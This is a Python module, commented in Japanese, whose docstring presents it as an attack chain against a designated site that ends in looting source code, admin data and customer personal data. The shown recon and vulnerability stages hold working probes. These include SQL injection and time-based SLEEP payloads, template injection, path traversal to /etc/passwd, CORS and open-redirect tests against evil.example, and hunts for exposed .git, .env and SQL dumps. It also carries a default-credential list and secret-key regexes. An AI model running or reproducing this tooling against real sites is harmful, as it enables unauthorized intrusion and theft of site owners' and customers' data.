"""app/siege_ops.py — 指定サイトへの攻撃チェーン実装。

段階: recon → vuln → exploit → escalate → loot → down
各段は findings を積み、exploit 以降は実データ（ソース/管理データ/顧客PII）を loot に落とす。
"""

from __future__ import annotations
import base64, json, re, socket, ssl, time, urllib.parse
from concurrent.futures import ThreadPoolExecutor
import requests

UA = ("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0 Safari/537.36")
S = {"critical": 40, "high": 20, "medium": 8, "low": 3, "info": 1}
PII = {"email": r"[A-Za-z0-9._%+\-]+@[A-Za-z0-9.\-]+\.[A-Za-z]{2,}",
       "tel_jp": r"0\d{1,4}[\-‐\s]?\d{1,4}[\-‐\s]?\d{3,4}",
       "tel_intl": r"\+\d{8,15}", "zip": r"〒?\d{3}[-‐]\d{4}"}


def _s():
    s = requests.Session(); s.headers.update({"User-Agent": UA, "Accept-Language": "ja,en;q=0.8"}); return s


def _f(fl, k, sev, t, d, ev="", url=""):
    fl.append({"k": k, "sev": sev, "title": t, "detail": d, "evidence": str(ev)[:400], "url": url})


def _base(u):
    return (u if re.match(r"^https?://", u) else "https://" + u).rstrip("/")


TECH = [(r"wp-content|wp-includes", "WordPress"), (r"Drupal", "Drupal"), (r"Joomla", "Joomla"),
        (r"laravel_session|Laravel", "Laravel"), (r"JSESSIONID", "Java/Spring"),
        (r"__NEXT_DATA__|_next/", "Next.js"), (r"csrfmiddlewaretoken", "Django"),
        (r"_rails_session|csrf-token", "Rails"), (r"PHPSESSID", "PHP"), (r"ASP.NET", "ASP.NET"),
        (r"X-Powered-By: Express", "Express")]
WAF = [(r"cloudflare|cf-ray", "Cloudflare"), (r"akamai", "Akamai"), (r"cloudfront", "CloudFront"),
       (r"sucuri", "Sucuri"), (r"incap_ses|visid_incap", "Imperva")]
HDR = {"strict-transport-security": ("high", "HSTS なし"), "content-security-policy": ("high", "CSP なし"),
       "x-frame-options": ("medium", "XFO なし"), "x-content-type-options": ("low", "XCTO なし"),
       "referrer-policy": ("low", "Referrer-Policy なし"), "permissions-policy": ("low", "Permissions-Policy なし")}
EXPOSE = [("/.git/HEAD", "critical", "Git 露出", r"^ref:"), ("/.git/config", "critical", "Git config", r"\[core\]"),
          ("/.svn/entries", "high", "SVN 露出", r"\d+"), ("/.hg/requires", "high", "Mercurial 露出", r"revlog"),
          ("/.env", "critical", ".env", r"=\S"), ("/.env.production", "critical", ".env.prod", r"="),
          ("/config.php.bak", "high", "config.bak", r"<\?php"), ("/web.config", "medium", "web.config", r"<configuration"),
          ("/backup.zip", "high", "backup.zip", r"PK"), ("/backup.tar.gz", "high", "backup.tar.gz", r"\x1f\x8b"),
          ("/backup.sql", "critical", "SQL ダンプ", r"INSERT INTO|CREATE TABLE"),
          ("/dump.sql", "critical", "SQL ダンプ", r"INSERT INTO"), ("/db.sqlite", "critical", "SQLite 実体", r"SQLite format"),
          ("/.DS_Store", "low", "DS_Store", r"Bud1"), ("/phpinfo.php", "medium", "phpinfo", r"PHP Version"),
          ("/server-status", "medium", "server-status", r"Apache Server Status"), ("/actuator/env", "critical", "Actuator env", r"propertySources"),
          ("/actuator/heapdump", "critical", "heapdump", r"JAVA PROFILE"), ("/swagger-ui.html", "medium", "Swagger", r"swagger"),
          ("/openapi.json", "medium", "OpenAPI", r"openapi"), ("/graphql", "medium", "GraphQL", r"GraphQL|query"),
          ("/console", "medium", "console", r"(?i)console|h2|login"), ("/.well-known/security.txt", "info", "security.txt", r"Contact"),
          ("/robots.txt", "info", "robots", r"Disallow"), ("/sitemap.xml", "info", "sitemap", r"<urlset"),
          ("/crossdomain.xml", "low", "crossdomain.xml", r"cross-domain-policy")]
ADMINP = ["/admin", "/admin/login", "/administrator", "/wp-admin/", "/wp-login.php", "/manage", "/management",
          "/dashboard", "/console", "/api/admin", "/admin.php", "/login", "/staff", "/cms", "/panel"]
SECRETS = [("aws", r"AKIA[0-9A-Z]{16}", "critical", "AWS キー"), ("gcp", r"AIza[0-9A-Za-z_\-]{35}", "high", "GCP キー"),
           ("gh", r"gh[pousr]_[0-9A-Za-z]{36}", "critical", "GitHub トークン"), ("stripe", r"sk_live_[0-9A-Za-z]{16,}", "critical", "Stripe 本番"),
           ("jwt", r"eyJ[\w\-]{10,}\.eyJ[\w\-]{10,}\.[\w\-]{10,}", "high", "JWT"), ("pk", r"-----BEGIN (?:RSA |EC )?PRIVATE KEY-----", "critical", "秘密鍵"),
           ("dburl", r"(?:mysql|postgres|mongodb(?:\+srv)?|redis)://[^\s\"'<>]{8,}", "critical", "DB 接続文字列"),
           ("smtp", r"smtp[^\n]{0,40}(?:pass|pwd)[^\n]{0,40}", "high", "SMTP 認証")]
DEFCRED = [("admin", "admin"), ("admin", "password"), ("admin", "admin123"), ("admin", "123456"),
           ("root", "root"), ("test", "test"), ("administrator", "administrator"), ("admin", "P@ssw0rd")]


# ───────────────────────── recon
def recon(u):
    b = _base(u); fl = []; out = {"target": b, "subs": [], "tech": [], "waf": []}
    s = _s()
    try:
        r = s.get(b, timeout=15)
    except Exception as e:
        _f(fl, "down", "high", "到達不能", repr(e)[:200], "", b); out["findings"] = fl; return out
    h = {k.lower(): v for k, v in r.headers.items()}
    txt = r.text[:200000]
    for pat, name in TECH:
        if re.search(pat, txt, re.I) or re.search(pat, json.dumps(h), re.I): out["tech"].append(name)
    for pat, name in WAF:
        if re.search(pat, json.dumps(h) + txt[:4000], re.I): out["waf"].append(name)
    if out["tech"]: _f(fl, "tech", "info", "技術判定: " + ", ".join(out["tech"]), "既知 CVE の的", "", b)
    if out["waf"]: _f(fl, "waf", "medium", "WAF/CDN: " + ", ".join(out["waf"]), "素の攻撃は弾かれる。迂回かレート配慮が必要", "", b)
    host = urllib.parse.urlsplit(b).hostname or ""
    try: out["ip"] = socket.gethostbyname(host)
    except Exception: out["ip"] = ""
    if b.startswith("https"):
        try:
            ctx = ssl.create_default_context()
            with ctx.wrap_socket(socket.create_connection((host, 443), 8), server_hostname=host) as ss:
                cert = ss.getpeercert()
            sans = [v for k, v in cert.get("subjectAltName", ()) if k == "DNS"]
            out["sans"] = sans; out["cert_to"] = cert.get("notAfter")
            _f(fl, "cert", "info", "証明書 SAN", ", ".join(sans[:20]), "", b)
            for san in sans[:20]:
                if san.startswith("*."): out["subs"].append(san[2:])
                elif san != host: out["subs"].append(san)
        except Exception as e:
            _f(fl, "cert:bad", "high", "証明書異常", repr(e)[:160], "", b)
    for p in ("/robots.txt", "/sitemap.xml"):
        try:
            rr = s.get(b + p, timeout=8)
            for m in re.findall(r"(?:Disallow:\s*|https?://[^/\s]+)?(/[\w\-./]+)", rr.text)[:40]:
                if m not in ("/",) and not m.startswith("//"): out.setdefault("paths", []).append(m)
        except Exception: pass
    _f(fl, "surface", "info", "収集パス数", str(len(out.get("paths", []))), "", b)
    out["findings"] = fl; return out


# ───────────────────────── vuln
def vuln(u, rec=None):
    b = _base(u); fl = []; s = _s(); out = {"target": b, "expose": [], "graphql": [], "forms": []}
    try: top = s.get(b, timeout=15)
    except Exception: out["findings"] = fl; return out
    h = {k.lower(): v for k, v in top.headers.items()}
    for k, (sev, title) in HDR.items():
        if k not in h: _f(fl, "hdr:" + k, sev, title, "ブラウザ側の緩和が効かない", "", b)
    csp = h.get("content-security-policy", "")
    if "unsafe-inline" in csp: _f(fl, "csp", "high", "CSP unsafe-inline", "XSS が刺さる", csp[:200], b)
    for c in top.cookies:
        miss = [n for n, ok in (("Secure", c.secure), ("HttpOnly", c.has_nonstandard_attr("HttpOnly")), ("SameSite", bool(c.get_nonstandard_attr("SameSite")))) if not ok]
        if miss: _f(fl, "cookie:" + c.name, "medium", f"{c.name} に {','.join(miss)} なし", "盗難/CSRF", c.name, b)
    if top.text.count("<script") and re.search(r"<script[^>]+src=[\"']http", top.text):
        if not re.search(r"integrity=", top.text): _f(fl, "sri", "low", "SRI なし外部 script", "CDN 汚染", "", b)
    evil = "https://evil.example"
    for p in ("/", "/api", "/api/me"):
        try: rr = s.get(b + p, headers={"Origin": evil}, timeout=8)
        except Exception: continue
        if rr.headers.get("access-control-allow-origin") == evil:
            sev = "critical" if rr.headers.get("access-control-allow-credentials", "").lower() == "true" else "medium"
            _f(fl, "cors", sev, "CORS が Origin 反射", "任意サイトからAPI読み取り", p, b + p); break
    for p in ("next", "url", "redirect", "return", "to", "r"):
        try: rr = s.get(f"{b}/?{p}=https://evil.example/x", timeout=8)
        except Exception: continue
        if "evil.example" in rr.url: _f(fl, "openredir", "medium", f"オープンリダイレクト ?{p}", "正規ドメイン経由で飛ばせる", rr.url, b); break
    try:
        if "evil.example" in s.get(b, headers={"Host": "evil.example"}, timeout=8).text[:20000]:
            _f(fl, "hosthdr", "medium", "Host ヘッダ注入", "PWリセットURL書き換え", "", b)
    except Exception: pass
    for m in ("OPTIONS", "TRACE", "PUT", "DELETE"):
        try: rr = s.request(m, b, timeout=8)
        except Exception: continue
        if m == "OPTIONS" and re.search(r"PUT|DELETE", rr.headers.get("allow", "")):
            _f(fl, "method", "high", "PUT/DELETE 許可", rr.headers.get("allow"), "", b)
        if m == "TRACE" and rr.status_code == 200 and "TRACE" in rr.text:
            _f(fl, "trace", "low", "TRACE 有効", "XST", "", b)
    for hp, hv in (("X-Original-URL", "/admin"), ("X-Rewrite-URL", "/admin"), ("X-Forwarded-For", "127.0.0.1")):
        try: rr = s.get(b, headers={hp: hv}, timeout=8)
        except Exception: continue
        if rr.status_code == 200 and re.search(r"(?i)admin|dashboard|管理", rr.text[:3000]):
            _f(fl, "bypass:" + hp, "high", f"{hp} で管理到達", "プロキシ迂回", hv, b)
    for path, sev, title, sig in EXPOSE:
        try: rr = s.get(b + path, timeout=8)
        except Exception: continue
        if rr.status_code == 200 and re.search(sig, rr.text[:6000], re.I | re.M):
            _f(fl, "expose:" + path, sev, title, "取得可能", rr.text[:160], b + path)
            out["expose"].append({"path": path, "sev": sev, "title": title, "url": b + path, "len": len(rr.content)})
    try:
        if re.search(r"<title>\s*Index of", s.get(b + "/", timeout=8).text, re.I):
            _f(fl, "dirlist", "high", "ディレクトリリスティング", "全ファイル列挙", "", b)
    except Exception: pass
    try:
        rr = s.post(b + "/graphql", json={"query": "{__schema{types{name kind}}}"}, timeout=10)
        if rr.status_code == 200 and "__schema" in rr.text:
            _f(fl, "graphql", "high", "GraphQL イントロスペクション", "スキーマ全取得", "", b + "/graphql")
            out["graphql"] = list(dict.fromkeys(re.findall(r'"name":"(\w+)"', rr.text)))[:60]
    except Exception: pass
    for pat, key, sev, title in (("'", "sqli:e", "critical", "SQLi（エラー）"), ("%27%20AND%20SLEEP(2)--%20", "sqli:t", "critical", "SQLi（時間）")):
        try:
            t0 = time.time(); rr = s.get(b + "/?id=1" + pat, timeout=15)
            if key.endswith("e") and re.search(r"(?i)SQL syntax|mysql_|unclosed quotation|PostgreSQL.*ERROR|ORA-\d{5}|SQLite.*error", rr.text):
                _f(fl, "sqli", "critical", title, "UNION/blind で全件抽出可", rr.text[:160], b); break
            if key.endswith("t") and time.time() - t0 > 1.8:
                _f(fl, "sqli", "critical", title, "ブラインドで全件抽出可", f"{time.time()-t0:.1f}s", b); break
        except Exception: pass
    try:
        rr = s.get(b + "/?q=%7B%7B7*7%7D%7D&name=%7B%7B7*7%7D%7D", timeout=10)
        if "49" in rr.text: _f(fl, "ssti", "critical", "SSTI の疑い", "{{7*7}} が 49 に", "", b)
    except Exception: pass
    for p in ("/../../../../etc/passwd", "/?file=../../../../etc/passwd", "/?page=php://filter/convert.base64-encode/resource=index"):
        try:
            rr = s.get(b + p, timeout=10)
            if re.search(r"root:.*:0:0:", rr.text) or (rr.status_code == 200 and len(rr.text) > 100 and re.match(r"^[A-Za-z0-9+/=\s]+$", rr.text[:200])):
                _f(fl, "lfi", "critical", "LFI/パストラバーサル", "ローカルファイル読取", p, b + p); break
        except Exception: pass
    for path in ADMINP:
        try: rr = s.get(b + path, timeout=8)
        except Exception: continue
        if rr.status_code == 200 and re.search(r"<input[^>]+type=[\"']password", rr.text, re.I):
            out["forms"].append(b + path); _f(fl, "loginform", "medium", "ログインフォーム " + path, "総当たり/デフォルト認証", "", b + path)
            if len(out["forms"]) >= 3: break
    for m in re.finditer(r"(?:src|href)=[\"']([^\"']+\.js)(?:\?[^\"']*)?[\"']", top.text):
        js = urllib.parse.urljoin(b + "/", m.group(1))
        try:
            if s.get(js, timeout=8).status_code == 200:
                mp = s.get(js + ".map", timeout=8)
                if mp.status_code == 200 and '"sources"' in mp.text[:2000]:
                    _f(fl, "srcmap", "critical", "ソースマップ公開", "フロントの原本が復元できる", js, js + ".map")
                    out.setdefault("maps", []).append(js + ".map")
        except Exception: pass
    out["findings"] = fl; return out